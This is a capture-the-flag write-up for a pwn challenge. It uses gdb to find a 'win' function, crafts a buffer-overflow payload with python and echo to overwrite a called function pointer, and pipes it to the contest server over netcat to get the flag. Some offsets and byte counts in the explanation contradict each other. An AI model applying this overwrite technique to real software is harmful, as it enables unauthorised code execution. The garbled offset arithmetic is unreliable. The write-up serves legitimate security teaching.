---
title: "Overflowing with files"
description: "They also seem to have quite an interesting top-secret file delivery system, developed in C of all things?! Find a way to get the contents of the top-secret document.\n\n`nc chals.secedu.site 5001`"
pubDate: 2024-09-12
ctf: "SecEdu CTF 2024"
category: "pwn"
author: "sealldev & finnersio"
section: "CTFs"
image: "images/24-secedu/icon.png"
---



From the challenge description we know the program was written in C, and we can analyse the program in gdb.

Running the program we see the top-secret document is at the memory address `0x4011f6`.
```bash
./chal
Welcome to ORG-A's epic "File distribution system"! Here is the address of the function that contains the top-secret documents: 0x4011f6
Please don't visit this, okay?
Response
```

Loading up gdb, we can run `info functions` to see what symbols are left in the binary. We see among others a function called `win` at `0x4011f6`, we know where we need to get to.
```c
gdb chal
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
...
0x00000000004011f6  win
0x0000000000401268  exiting
0x0000000000401282  main
...
```

Taking a look at the main function, there's not much we care about until towards the end:

```c
# Note I am using intel disassembly flavor, not AT&T
0x00000000004012f6 <+116>:	call   0x401100 <__isoc99_scanf@plt>
0x00000000004012fb <+121>:	mov    rax,QWORD PTR [rbp-0x10]
0x00000000004012ff <+125>:	mov    rsi,rax
0x0000000000401302 <+128>:	lea    rax,[rip+0xe37]        # 0x402140
0x0000000000401309 <+135>:	mov    rdi,rax
0x000000000040130c <+138>:	mov    eax,0x0
0x0000000000401311 <+143>:	call   0x4010c0 <printf@plt>
0x0000000000401316 <+148>:	mov    rax,QWORD PTR [rbp-0x10]
0x000000000040131a <+152>:	call   rax
0x000000000040131c <+154>:	mov    eax,0x0
0x0000000000401321 <+159>:	leave
0x0000000000401322 <+160>:	ret
```

We see a call to `scanf` to capture the user's input, and another call to `prinf`.  But we also see the return address (`rax`) being assigned to a value offset of the base pointer (`rbp`).

```c
0x0000000000401316 <+148>:	mov    rax,QWORD PTR [rbp-0x10]
```

Let's see how our data is being stored in the program, we will set a breakpoint at the statement above.

```c
(gdb) break *main+152
Breakpoint 1 at 0x40131a
(gdb) r
Starting program: 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to ORG-A's epic "File distribution system"! Here is the address of the function that contains the top-secret documents: 0x4011f6
Please don't visit this, okay?
Response: AAAAAAAAAAAAAAAAAAA
Okay, you know what? Lets go to 0x401268!!
 Andddd.... here we go!


Breakpoint 1, 0x000000000040131a in main ()
```

Looking at the stack pointer, we see our input and we know it is being stored on the stack. Let's see if we can overflow the buffer and change `rax` to the secret-document address.
```c
(gdb) x/s $rsp
0x7fffffffe090:	'A' <repeats 19 times>
```

From the below we know an 8 byte value (`QWORD PTR`) is being loaded into `rax` from `rbp-0x16` (`rbp - 16 bytes`).
```c
0x0000000000401316 <+148>:	mov    rax,QWORD PTR [rbp-0x10]
```

Craft a payload 16 bytes long with an extra byte at the end for the new address for `rax`.

```bash
python3 -c 'print("a"*8*16 + "A"*8)'
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAA
```

Run the program again.
```c
Breakpoint 1, 0x000000000040131a in main ()
(gdb) x/s $rsp
0x7fffffffe090:	'a' <repeats 128 times>, "AAAAAAAA"
(gdb) p/x $rax
$2 = 0x4141414141414141
```

It worked! `rax` is all "A" (0x41 in hex). Let's make the payload the actual address of the secret document. Unfortunately, `0x4011f6` isn't all printable characters so we will need a file for our payload. 

```bash
echo -ne 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf6\x11\x40' > payload.txt
```

We will use `echo` to save the non-printable characters to a file and load the address in reverse order as we are on a little-endian system.

Run the program with the file as input:
```c
(gdb) r < payload.txt
...
Response: Okay, you know what? Lets go to 0x4011f6!!
 Andddd.... here we go!

Awesome work, here is the only top secret file, obvious employee:
```

We have the secret file, now to do it for real with netcat. 

```
Welcome to ORG-A's epic "File distribution system"! Here is the address of the function that contains the top-secret documents: 0x4011bd
Please don't visit this, okay?
Response: s
Okay, you know what? Lets go to 0x40122b!!
 Andddd.... here we go!

Nothing found here, but thanks for stopping by!
```

We know the program, and we know the buffer. This time we are going to `0x4011bd`. Make a new payload, and send the file with netcat along with the `-q` to quit the transmission after one second.

```bash
cat payload.txt | nc -q 1 chals.secedu.site 5001
Welcome to ORG-A's epic "File distribution system"! Here is the address of the function that contains the top-secret documents: 0x4011bd
Please don't visit this, okay?
Response: Okay, you know what? Lets go to 0x4011bd!!
 Andddd.... here we go!

Awesome work, here is the only top secret file, obvious employee:
SECEDU{h0w_c4n_u_0v3rfl0w_with_0n3_f1le?}
```

Flag: `SECEDU{h0w_c4n_u_0v3rfl0w_with_0n3_f1le?}`